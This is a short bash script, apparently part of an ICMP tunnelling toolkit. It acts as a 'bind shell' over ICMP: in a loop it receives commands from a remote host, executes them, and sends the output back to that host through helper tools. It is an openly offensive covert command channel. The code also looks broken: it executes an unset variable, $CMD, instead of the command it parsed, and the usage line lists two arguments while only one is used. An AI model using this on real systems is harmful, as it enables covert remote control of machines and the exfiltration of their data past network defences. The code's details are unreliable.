#!/bin/bash

# Usage: ./qsproxy.sh <ip_remote_listener> <ip_listening>
# It a "bind shell" trough ICMP so it is quite ordinary if it takes time or if
# all commands aren't well treated

LISTEN=$1

while [[ 1 ]]; do
    ##Get curl command
    RECEIVE_OUTPUT=$(../../qsreceiver receive truncated 1 -l $LISTEN)
    REMOTE=$(echo $RECEIVE_OUTPUT | cut -d ':' -f 2 | cut -d "," -f 1 | cut -d ' ' -f 2 )
    #echo "REMOTE: $REMOTE"

    CURL_CMD=$(echo $RECEIVE_OUTPUT | rev | cut -d ':' -f 1 | rev )
    #echo $CURL_CMD

    ##Execute it
    CURL_OUTPUT=$($CMD)

    #echo $CURL_OUTPUT

    ##Return output to remote
    ../../qssender send "$CURL_OUTPUT" -d 1 -l $LISTEN -r $REMOTE -s 100 -N
done